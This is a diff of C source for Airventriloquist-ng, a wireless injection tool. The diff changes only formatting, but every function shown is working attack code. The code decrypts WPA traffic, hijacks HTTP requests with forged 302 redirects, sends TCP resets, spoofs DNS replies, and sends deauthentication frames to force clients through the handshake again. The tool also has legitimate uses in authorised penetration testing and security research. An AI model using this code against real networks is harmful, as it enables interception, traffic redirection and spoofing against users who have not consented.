 						&& (p_http[0] == 0x47 && p_http[1] == 0x45
 							&& p_http[2] == 0x54))
@@ -1525,9 +1536,9 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 								   "for\n");
 							if (NULL != opt.p_redir_url)
 							{
-								char *p_hit =
-									strstr((const char *) p_http,
-										   (const char *) opt.p_redir_url);
+								char * p_hit
+									= strstr((const char *) p_http,
+											 (const char *) opt.p_redir_url);
 								if (NULL != p_hit)
 								{
 									printf("Caught our own redirect, ignoring "
@@ -1550,66 +1561,72 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 
 						memcpy(pkt, packet_start, packet_start_length);
 
-						struct tcp_hdr *p_restcp =
-							(struct tcp_hdr *) (pkt + offset_proto);
-						struct ip_frame *p_resip =
-							(struct ip_frame *) (pkt + offset_ip);
-						u_int32_t res_length =
-							packet_start_length; // This only initially until we replace content
+						struct tcp_hdr * p_restcp
+							= (struct tcp_hdr *) (pkt + offset_proto);
+						struct ip_frame * p_resip
+							= (struct ip_frame *) (pkt + offset_ip);
+						u_int32_t res_length
+							= packet_start_length; // This only initially until
+												   // we replace content
 
 						//-----------------------------------------------------------------------------
-						//Do some magic here... to create a frame to close the server connection
+						// Do some magic here... to create a frame to close the
+						// server connection
 						memcpy(tmpbuf, pkt, packet_start_length);
-						struct ip_frame *p_resip_ack =
-							(struct ip_frame *) (tmpbuf + offset_ip);
-						struct tcp_hdr *p_restcp_ack =
-							(struct tcp_hdr *) (tmpbuf + offset_proto);
+						struct ip_frame * p_resip_ack
+							= (struct ip_frame *) (tmpbuf + offset_ip);
+						struct tcp_hdr * p_restcp_ack
+							= (struct tcp_hdr *) (tmpbuf + offset_proto);
 
-						res_length =
-							offset_proto + hdr_size
-							+ extra_enc_length; // have to account for MIC
+						res_length
+							= offset_proto + hdr_size
+							  + extra_enc_length; // have to account for MIC
 						p_resip_ack->id = htons(ntohs(p_resip_ack->id) + 1023);
-						p_resip_ack->tot_len =
-							htons(hdr_size + sizeof(struct ip_frame));
+						p_resip_ack->tot_len
+							= htons(hdr_size + sizeof(struct ip_frame));
 						p_resip_ack->check = 0;
-						p_resip_ack->check =
-							calcsum((unsigned short *) p_resip_ack,
-									sizeof(struct ip_frame));
+						p_resip_ack->check
+							= calcsum((unsigned short *) p_resip_ack,
+									  sizeof(struct ip_frame));
 
 						// We could try some stuff with tcp reset
-						//p_restcp_ack->fin = 1;
-						//p_restcp_ack->ack = 0;
-						//p_restcp_ack->psh = 0;
+						// p_restcp_ack->fin = 1;
+						// p_restcp_ack->ack = 0;
+						// p_restcp_ack->psh = 0;
 						p_restcp_ack->rst = 1;
 
-						//Lets calculate the TCP checksum
+						// Lets calculate the TCP checksum
 						p_restcp_ack->checksum = 0;
-						p_restcp_ack->checksum =
-							calcsum_tcp((void *) p_restcp_ack,
-										(hdr_size),
-										p_resip_ack->saddr,
-										p_resip_ack->daddr);
+						p_restcp_ack->checksum
+							= calcsum_tcp((void *) p_restcp_ack,
+										  (hdr_size),
+										  p_resip_ack->saddr,
+										  p_resip_ack->daddr);
 
 						int tmpbuf_len = res_length;
-						//Going to send the packet later, after we send the redirect...
-						//if( send_packet( tmpbuf, res_length ) != 0 )
+						// Going to send the packet later, after we send the
+						// redirect...
+						// if( send_packet( tmpbuf, res_length ) != 0 )
 						//    printf("ERROR: couldn't send Ack\n");
 						//-----------------------------------------------------------------------------
-						//The silly extra TCP options were messing with me, Packets with TCP options
-						// Weren't being accepted. Probably some silly offset miscalculation. But for
+						// The silly extra TCP options were messing with me,
+						// Packets with TCP options
+						// Weren't being accepted. Probably some silly offset
+						// miscalculation. But for
 						// Our purposes, just cut these out.
 						// So get those options out of there
 						int diff = hdr_size - sizeof(struct tcp_hdr);
 						if (0 != diff)
 						{
 							hdr_size = sizeof(struct tcp_hdr);
-							p_resip->tot_len =
-								htons(ntohs(p_resip->tot_len) - diff);
+							p_resip->tot_len
+								= htons(ntohs(p_resip->tot_len) - diff);
 						}
-						//Update the TCP header with the new size (if changed)
+						// Update the TCP header with the new size (if changed)
 						p_restcp->doff = hdr_size / 4;
 
-						//start manipulating the packet to turn it around back to the sender
+						// start manipulating the packet to turn it around back
+						// to the sender
 						packet_turnaround_80211(pkt);
 						packet_turnaround_ip(p_resip);
 						packet_turnaround_ip_tcp(p_restcp,
@@ -1617,27 +1634,28 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 													 - sizeof(struct ip_frame)
 													 - hdr_size);
 
-						//Pointer to the start of the http section
+						// Pointer to the start of the http section
 						p_http = pkt + offset_proto + hdr_size;
 						l_http = strlen(opt.p_redir_pkt_str);
 
-						//Copy the http frame we wish to send
+						// Copy the http frame we wish to send
 						memcpy(p_http, opt.p_redir_pkt_str, l_http);
-						res_length =
-							offset_proto + hdr_size + l_http
-							+ extra_enc_length; // have to account for MIC
+						res_length
+							= offset_proto + hdr_size + l_http
+							  + extra_enc_length; // have to account for MIC
 
-						//Set checksum to zero before calculating...
+						// Set checksum to zero before calculating...
 						p_resip->frag_off = 0x0000;
-						// Incrementing the ID by something, Could try to calculate this...
+						// Incrementing the ID by something, Could try to
+						// calculate this...
 						p_resip->id = htons(ntohs(p_resip->id) + 1025);
-						p_resip->tot_len =
-							htons(l_http + hdr_size + sizeof(struct ip_frame));
+						p_resip->tot_len = htons(l_http + hdr_size
+												 + sizeof(struct ip_frame));
 						p_resip->check = 0;
 						p_resip->check = calcsum((unsigned short *) p_resip,
 												 sizeof(struct ip_frame));
 
-						//Lets calculate the TCP checksum
+						// Lets calculate the TCP checksum
 						p_restcp->checksum = 0;
 						p_restcp->checksum = calcsum_tcp((void *) p_restcp,
 														 (hdr_size + l_http),
@@ -1662,8 +1680,8 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 						if (send_packet(pkt, res_length) != 0)
 							printf("Error Sending Packet\n");
 						printf("\n");
-						//Uncomment to send RST packet to the server
-						//if( send_packet( tmpbuf, tmpbuf_len ) != 0 )
+						// Uncomment to send RST packet to the server
+						// if( send_packet( tmpbuf, tmpbuf_len ) != 0 )
 						//    printf("ERROR: couldn't send Ack\n");
 						return;
 					}
@@ -1671,9 +1689,9 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 			}
 			else if ((short) PROTO_UDP == p_ip->protocol && opt.flag_dnsspoof)
 			{
-				struct udp_hdr *p_udp = (struct udp_hdr *) packet;
+				struct udp_hdr * p_udp = (struct udp_hdr *) packet;
 
-				//DNS packet
+				// DNS packet
 				if (53 == ntohs(p_udp->dport))
 				{
 					hexDump("DNS", (void *) packet, length);
@@ -1683,16 +1701,16 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 					packet_turnaround_ip_udp(
 						(struct udp_hdr *) (pkt + offset_proto));
 
-					struct udp_hdr *p_resudp =
-						(struct udp_hdr *) (pkt + offset_proto);
+					struct udp_hdr * p_resudp
+						= (struct udp_hdr *) (pkt + offset_proto);
 
 					int dns_offset = offset_proto + sizeof(struct udp_hdr);
-					u_int8_t *p_dns = packet_start + dns_offset;
-					u_int8_t *p_resdns = pkt + dns_offset;
+					u_int8_t * p_dns = packet_start + dns_offset;
+					u_int8_t * p_resdns = pkt + dns_offset;
 
 					// Copy the beginning part of the packet
 					memcpy(p_resdns, DNS_RESP_PCKT_1, sizeof(DNS_RESP_PCKT_1));
-					struct dns_query *p_dnsq = (struct dns_query *) p_dns;
+					struct dns_query * p_dnsq = (struct dns_query *) p_dns;
 					int dns_qlen = dns_name_end((u_int8_t *) &p_dnsq->qdata,
 												packet_start_length);
 
@@ -1704,29 +1722,30 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 					memcpy(p_resdns + sizeof(DNS_RESP_PCKT_1) - 1 + dns_qlen,
 						   DNS_RESP_PCKT_2,
 						   sizeof(DNS_RESP_PCKT_2));
-					//Calculate the new resp length
+					// Calculate the new resp length
 					int dns_resplen = sizeof(DNS_RESP_PCKT_1) - 1 + dns_qlen
 									  + sizeof(DNS_RESP_PCKT_2);
 
 					struct sockaddr_in s_in;
-					inet_pton(AF_INET, "127.0.0.1", &s_in); //Website will work
+					inet_pton(AF_INET, "127.0.0.1", &s_in); // Website will work
 					memcpy(p_resdns + dns_resplen - 5, &s_in, 4);
-					//int ret = inet_aton("192.168.1.102", &s_in);
-					//int ret = inet_aton("50.89.71.10", &s_in);
+					// int ret = inet_aton("192.168.1.102", &s_in);
+					// int ret = inet_aton("50.89.71.10", &s_in);
 
-					//Copy over our own specified IP address
-					//memcpy(p_resdns + dns_resplen - 5, &opt.p_dnsspoof_ip, 4);
+					// Copy over our own specified IP address
+					// memcpy(p_resdns + dns_resplen - 5, &opt.p_dnsspoof_ip,
+					// 4);
 
-					//copy the Transaction ID
+					// copy the Transaction ID
 					p_resdns[0] = p_dns[0];
 					p_resdns[1] = p_dns[1];
 
-					struct ip_frame *p_resip =
-						(struct ip_frame *) (pkt + offset_ip);
-					p_resip->tot_len =
-						htons(dns_resplen + sizeof(struct udp_hdr)
-							  + sizeof(struct ip_frame));
-					//Set checksum to zero before calculating...
+					struct ip_frame * p_resip
+						= (struct ip_frame *) (pkt + offset_ip);
+					p_resip->tot_len
+						= htons(dns_resplen + sizeof(struct udp_hdr)
+								+ sizeof(struct ip_frame));
+					// Set checksum to zero before calculating...
 					p_resip->check = 0;
 					p_resip->check = calcsum((unsigned short *) p_resip,
 											 sizeof(struct ip_frame));
@@ -1751,7 +1770,7 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 						packet_start_length += extra_enc_length;
 						encrypt_data_packet(
 							pkt, packet_start_length, opt.st_cur);
-						//hexDump("Full encrypted", pkt,packet_start_length);
+						// hexDump("Full encrypted", pkt,packet_start_length);
 					}
 
 					if (send_packet(pkt, packet_start_length) != 0)
@@ -1764,10 +1783,11 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 			else if ((1 == opt.flag_icmp_resp)
 					 && (short) PROTO_ICMP == p_ip->protocol)
 			{
-				struct icmp *p_icmp = (struct icmp *) packet;
+				struct icmp * p_icmp = (struct icmp *) packet;
 				if (p_icmp->icmp_type == 0)
 				{
-					//printf("ICMP Reply, %d, %d\n", p_icmp->icmp_id, p_icmp->icmp_seq);
+					// printf("ICMP Reply, %d, %d\n", p_icmp->icmp_id,
+					// p_icmp->icmp_seq);
 				}
 				if (p_icmp->icmp_type == 8)
 				{
@@ -1775,41 +1795,43 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 						   p_icmp->icmp_id,
 						   p_icmp->icmp_seq);
 
-					//copy the original Packet to our response packet buffer
+					// copy the original Packet to our response packet buffer
 					memcpy(pkt, packet_start, packet_start_length);
 
 					packet_turnaround_80211(pkt);
 					packet_turnaround_ip((struct ip_frame *) (pkt + offset_ip));
 
-					//Point to the IP frame
-					struct ip_frame *p_resip =
-						(struct ip_frame *) (pkt + offset_ip);
-					//Set checksum to zero before calculating checksum...
+					// Point to the IP frame
+					struct ip_frame * p_resip
+						= (struct ip_frame *) (pkt + offset_ip);
+					// Set checksum to zero before calculating checksum...
 					p_resip->check = 0;
 					p_resip->check = calcsum((unsigned short *) p_resip,
 											 sizeof(struct ip_frame));
 
-					struct icmp *p_resicmp =
-						(struct icmp *) (pkt + size_80211hdr
-										 + sizeof(struct llc_frame)
-										 + sizeof(struct ip_frame));
-					//Set the ICMP type as response
+					struct icmp * p_resicmp
+						= (struct icmp *) (pkt + size_80211hdr
+										   + sizeof(struct llc_frame)
+										   + sizeof(struct ip_frame));
+					// Set the ICMP type as response
 					p_resicmp->icmp_type = 0;
 
-					//Calculate how much data there is to calculate checksum over
-					int icmp_length =
-						packet_start_length
-						- (size_80211hdr + sizeof(struct llc_frame)
-						   + sizeof(struct ip_frame))
-						- extra_enc_length; // Don't forget extra MIC at the end of the frame
+					// Calculate how much data there is to calculate checksum
+					// over
+					int icmp_length
+						= packet_start_length
+						  - (size_80211hdr + sizeof(struct llc_frame)
+							 + sizeof(struct ip_frame))
+						  - extra_enc_length; // Don't forget extra MIC at the
+											  // end of the frame
 
 					if (opt.st_cur->keyver == 1)
 					{
 						icmp_length -= 4;
 					}
 					p_resicmp->icmp_cksum = 0;
-					p_resicmp->icmp_cksum =
-						calcsum((unsigned short *) p_resicmp, icmp_length);
+					p_resicmp->icmp_cksum
+						= calcsum((unsigned short *) p_resicmp, icmp_length);
 
 					if (IEEE80211_FC1_WEP & wfrm->i_fc[1])
 					{
@@ -1828,9 +1850,9 @@ static void process_unencrypted_data_packet(u_int8_t *packet,
 	}
 }
 
-static bool is_adhoc_frame(u_int8_t *packet)
+static bool is_adhoc_frame(u_int8_t * packet)
 {
-	u_int8_t *p_stmac = packet_get_sta_80211(packet);
+	u_int8_t * p_stmac = packet_get_sta_80211(packet);
 
 	if (NULL == p_stmac)
 	{
@@ -1842,7 +1864,7 @@ static bool is_adhoc_frame(u_int8_t *packet)
 	}
 }
 
-static bool find_station_in_db(u_int8_t *p_stmac)
+static bool find_station_in_db(u_int8_t * p_stmac)
 {
 	opt.st_prv = NULL;
 	opt.st_cur = opt.st_1st;
@@ -1856,10 +1878,10 @@ static bool find_station_in_db(u_int8_t *p_stmac)
 	}
 
 	if (NULL == opt.st_cur)
-		//If not fount, opt.st_cur == NULL
+		// If not fount, opt.st_cur == NULL
 		return FALSE;
 	else
-		//If found, opt.st_cur == p_stmac
+		// If found, opt.st_cur == p_stmac
 		return TRUE;
 }
 
@@ -1872,12 +1894,12 @@ static bool alloc_new_station_in_db(void)
 		perror("station malloc failed");
 		return FALSE;
 	}
-	//Zero out memory of newly allocated structure
+	// Zero out memory of newly allocated structure
 	memset(opt.st_cur, 0, sizeof(struct WPA_ST_info));
 	return TRUE;
 }
 
-static inline bool is_wfrm_encrypted(struct ieee80211_frame *wfrm)
+static inline bool is_wfrm_encrypted(struct ieee80211_frame * wfrm)
 {
 	return (wfrm->i_fc[1] & IEEE80211_FC1_WEP);
 }
@@ -1894,14 +1916,14 @@ static inline bool mac_is_multi_broadcast(unsigned char stmac[6])
 	return FALSE;
 }
 
-static void process_station_data(u_int8_t *packet, int length)
+static void process_station_data(u_int8_t * packet, int length)
 {
 	if (is_length_lt_wfrm(length)) return;
 
-	struct ieee80211_frame *wfrm = (struct ieee80211_frame *) packet;
+	struct ieee80211_frame * wfrm = (struct ieee80211_frame *) packet;
 
-	u_int8_t *p_stmac = packet_get_sta_80211(packet);
-	u_int8_t *p_bssid = packet_get_bssid_80211(packet);
+	u_int8_t * p_stmac = packet_get_sta_80211(packet);
+	u_int8_t * p_bssid = packet_get_bssid_80211(packet);
 
 	if (!find_station_in_db(p_stmac))
 	{
@@ -1926,12 +1948,12 @@ static void process_station_data(u_int8_t *packet, int length)
 			printf("BSSID   = ");
 			PRINTMAC(opt.st_cur->bssid);
 			printf(COL_REST);
-			//Attempt to force a de-auth and reconnect automagically ;)
+			// Attempt to force a de-auth and reconnect automagically ;)
 		}
 
 		if ((is_wfrm_encrypted(wfrm)) && (TRUE == opt.deauth))
 		{
-			//This frame was encrypted, so send some deauths to the station
+			// This frame was encrypted, so send some deauths to the station
 			// Hoping to reauth/reassoc to force 4 way handshake
 			if (FALSE == mac_is_multi_broadcast(opt.st_cur->stmac))
 			{
@@ -1943,30 +1965,30 @@ static void process_station_data(u_int8_t *packet, int length)
 	}
 }
 
-static inline bool wfrm_is_tods(struct ieee80211_frame *wfrm)
+static inline bool wfrm_is_tods(struct ieee80211_frame * wfrm)
 {
 	return (wfrm->i_fc[1] & IEEE80211_FC1_DIR_TODS);
 }
 
-static inline bool wfrm_is_fromds(struct ieee80211_frame *wfrm)
+static inline bool wfrm_is_fromds(struct ieee80211_frame * wfrm)
 {
 	return (wfrm->i_fc[1] & IEEE80211_FC1_DIR_FROMDS);
 }
 
-static inline bool is_wfrm_qos(struct ieee80211_frame *wfrm)
+static inline bool is_wfrm_qos(struct ieee80211_frame * wfrm)
 {
 	return (IEEE80211_FC0_SUBTYPE_QOS & wfrm->i_fc[0]);
 }
 
-static bool is_wfrm_already_processed(u_int8_t *packet, int length)
+static bool is_wfrm_already_processed(u_int8_t * packet, int length)
 {
-	struct ieee80211_frame *wfrm = (struct ieee80211_frame *) packet;
+	struct ieee80211_frame * wfrm = (struct ieee80211_frame *) packet;
 
 	// check if we haven't already processed this packet
 	// If we have, just return, don't process packet twice
 	u_int32_t crc = calc_crc_buf(packet, length);
 
-	//IF TODS
+	// IF TODS
 	if (wfrm_is_tods(wfrm))
 	{
 		if (crc == opt.st_cur->t_crc)
@@ -1975,7 +1997,7 @@ static bool is_wfrm_already_processed(u_int8_t *packet, int length)
 		}
 		opt.st_cur->t_crc = crc;
 	}
-	//IF FROMDS
+	// IF FROMDS
 	else if (wfrm_is_fromds(wfrm))
 	{
 		if (crc == opt.st_cur->f_crc)
@@ -1984,11 +2006,11 @@ static bool is_wfrm_already_processed(u_int8_t *packet, int length)
 		}
 		opt.st_cur->f_crc = crc;
 	}
-	//this frame hasn't been processed yet
+	// this frame hasn't been processed yet
 	return FALSE;
 }
 
-static struct llc_frame *find_llc_frm_ptr(u_int8_t *packet, int length)
+static struct llc_frame * find_llc_frm_ptr(u_int8_t * packet, int length)
 {
 	if (is_length_lt_wfrm(length)) return NULL;
 
@@ -1998,27 +2020,27 @@ static struct llc_frame *find_llc_frm_ptr(u_int8_t *packet, int length)
 		size_80211hdr = sizeof(struct ieee80211_qosframe);
 	}
 
-	struct llc_frame *p_llc = (struct llc_frame *) (packet + size_80211hdr);
+	struct llc_frame * p_llc = (struct llc_frame *) (packet + size_80211hdr);
 	return p_llc;
 }
 
-static void process_wireless_data_packet(u_int8_t *packet, int length)
+static void process_wireless_data_packet(u_int8_t * packet, int length)
 {
-	u_int8_t *packet_start = packet;
+	u_int8_t * packet_start = packet;
 	int packet_start_length = length;
 
-	struct ieee80211_frame *wfrm = (struct ieee80211_frame *) packet;
+	struct ieee80211_frame * wfrm = (struct ieee80211_frame *) packet;
 
 	if (is_adhoc_frame(packet))
 	{
 		return;
 	}
-	//u_int8_t *p_stmac = packet_get_sta_80211(packet);
+	// u_int8_t *p_stmac = packet_get_sta_80211(packet);
 
-	//TEMP DEBUG CAESURUS
-	//if(p_stmac[5] != 0x07) return;
+	// TEMP DEBUG CAESURUS
+	// if(p_stmac[5] != 0x07) return;
 
-	//process station,
+	// process station,
 	// if it exists, opt.st_cur will point to it
 	// if it doesn't exist, it will create an entry
 	//    with opt.st_cur pointing to it
@@ -2029,23 +2051,24 @@ static void process_wireless_data_packet(u_int8_t *packet, int length)
 		return;
 	}
 
-	struct llc_frame *p_llc = find_llc_frm_ptr(packet, length);
+	struct llc_frame * p_llc = find_llc_frm_ptr(packet, length);
 	if (NULL == p_llc)
 	{
 		return;
 	}
 
-	//Check to see if this is an encrypted frame
+	// Check to see if this is an encrypted frame
 	if (0xAA != p_llc->i_dsap && 0xAA != p_llc->i_ssap)
 	{
 		// OK so it's not valid LLC, lets check WEP
-		struct wep_frame *p_wep = (struct wep_frame *) packet;
+		struct wep_frame * p_wep = (struct wep_frame *) packet;
 
 		// check the extended IV flag
-		// I copied from airdecap-ng, not actually sure about WEP and don't care at this point
+		// I copied from airdecap-ng, not actually sure about WEP and don't care
+		// at this point
 		if ((wfrm->i_fc[1] & IEEE80211_FC1_WEP) && (0 != (p_wep->keyid & 0x20)))
 		{
-			//Unsupported ;)
+			// Unsupported ;)
 			printf("unsupported encryption\n");
 			return;
 		}
@@ -2055,8 +2078,9 @@ static void process_wireless_data_packet(u_int8_t *packet, int length)
 			{
 				return;
 			}
-			//Apparently this is a WPA packet
-			//Don't bother with this if we don't have a valid ptk for this station
+			// Apparently this is a WPA packet
+			// Don't bother with this if we don't have a valid ptk for this
+			// station
 			if ((NULL == opt.st_cur) || (!opt.st_cur->valid_ptk))
 			{
 				return;
@@ -2074,8 +2098,8 @@ static void process_wireless_data_packet(u_int8_t *packet, int length)
 						printf("TKIP decryption on this packet failed :( \n");
 						return;
 					}
-					//length -= 20;
-					//packet_start_length -= 20;
+					// length -= 20;
+					// packet_start_length -= 20;
 				}
 				else
 				{
@@ -2088,11 +2112,11 @@ static void process_wireless_data_packet(u_int8_t *packet, int length)
 						hexDump("failed to decrypt",
 								packet_start,
 								packet_start_length);
-						//printf("\n");
+						// printf("\n");
 						return;
 					}
-					//length -= 16;
-					//packet_start_length -= 16;
+					// length -= 16;
+					// packet_start_length -= 16;
 				}
 
 				process_unencrypted_data_packet(
@@ -2108,9 +2132,9 @@ static void process_wireless_data_packet(u_int8_t *packet, int length)
 	return;
 }
 
-static void process_wireless_packet(u_int8_t *packet, int length)
+static void process_wireless_packet(u_int8_t * packet, int length)
 {
-	struct ieee80211_frame *wfrm = (struct ieee80211_frame *) packet;
+	struct ieee80211_frame * wfrm = (struct ieee80211_frame *) packet;
 	short fc = *wfrm->i_fc;
 
 	if ((IEEE80211_FC0_TYPE_DATA & fc))
@@ -2240,7 +2264,7 @@ static int do_active_injection(void)
 	}
 }
 
-int main(int argc, char *argv[])
+int main(int argc, char * argv[])
 {
 	int option = 0;
 	int option_index = 0;
@@ -2272,7 +2296,7 @@ int main(int argc, char *argv[])
 	opt.flag_http_hijack = 0;
 	opt.flag_dnsspoof = 0;
 
-	char *p_redir_url = NULL;
+	char * p_redir_url = NULL;
 
 	progname = getVersion(
 		"Airventriloquist-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC);
@@ -2306,8 +2330,8 @@ int main(int argc, char *argv[])
 			case 'i':
 				printf("Selected Interface is %s\n", optarg);
 				opt.s_face = opt.iface_out = optarg;
-				opt.port_in =
-					get_ip_port(opt.s_face, opt.ip_in, sizeof(opt.ip_in) - 1);
+				opt.port_in
+					= get_ip_port(opt.s_face, opt.ip_in, sizeof(opt.ip_in) - 1);
 				opt.port_out = get_ip_port(
 					opt.iface_out, opt.ip_out, sizeof(opt.ip_out) - 1);
 				break;
@@ -2386,7 +2410,7 @@ int main(int argc, char *argv[])
 				return EXIT_SUCCESS;
 
 			default:
-			//intentional fall through
+			// intentional fall through
 			case ':':
 				printf("\"%s --help\" for help.\n", argv[0]);
 		}
@@ -2427,26 +2451,26 @@ int main(int argc, char *argv[])
 			opt.p_redir_url = p_redir_url;
 
 			printf("We have a redirect specified\n");
-			char *p_url = strstr(packet302_redirect, REDIRECT_PLACEHOLDER);
+			char * p_url = strstr(packet302_redirect, REDIRECT_PLACEHOLDER);
 
 			int total_len = strlen(packet302_redirect)
 							- strlen(REDIRECT_PLACEHOLDER)
 							+ strlen(p_redir_url);
 
-			//Allocate memory if we're modifying this
+			// Allocate memory if we're modifying this
 			opt.p_redir_pkt_str = malloc(total_len);
 			if (opt.p_redir_pkt_str != NULL)
 			{
-				char *p_curr = opt.p_redir_pkt_str;
+				char * p_curr = opt.p_redir_pkt_str;
 				int len_first = p_url - packet302_redirect;
-				//Copy the first part of the packet up to the URL in the header
+				// Copy the first part of the packet up to the URL in the header
 				memcpy(p_curr, packet302_redirect, len_first);
 
-				//Next copy the specified redirection URL from user input
+				// Next copy the specified redirection URL from user input
 				p_curr = opt.p_redir_pkt_str + len_first;
 				memcpy(p_curr, p_redir_url, strlen(p_redir_url));
 
-				//Copy the remainder of the packet...
+				// Copy the remainder of the packet...
 				p_curr += strlen(p_redir_url);
 				memcpy(p_curr,
 					   p_url + strlen(REDIRECT_PLACEHOLDER),
@@ -2464,7 +2488,7 @@ int main(int argc, char *argv[])
 			printf("WARNING: \n\tHijack term specified but no redirect "
 				   "specified\n");
 			printf("\tUsing the default redirect specified\n");
-			//Using default redirect in the hardcoded header....
+			// Using default redirect in the hardcoded header....
 			opt.p_redir_pkt_str = packet302_redirect;
 		}
 	}
@@ -2493,8 +2517,8 @@ int main(int argc, char *argv[])
 	}
 
 	/*
-       random source so we can identify our packets
-    */
+	   random source so we can identify our packets
+	*/
 	opt.r_smac[0] = 0x00;
 	opt.r_smac[1] = rand() & 0xFF;
 	opt.r_smac[2] = rand() & 0xFF;
@@ -2504,7 +2528,7 @@ int main(int argc, char *argv[])
 
 	opt.r_smac_set = 1;
 
-	//if there is no -h given, use default hardware mac
+	// if there is no -h given, use default hardware mac
 
 	if (maccmp(opt.r_smac, NULL_MAC) == 0)
 	{
@@ -2553,5 +2577,5 @@ int main(int argc, char *argv[])
 
 	return (do_active_injection());
 
-	//return 1;
+	// return 1;
 }
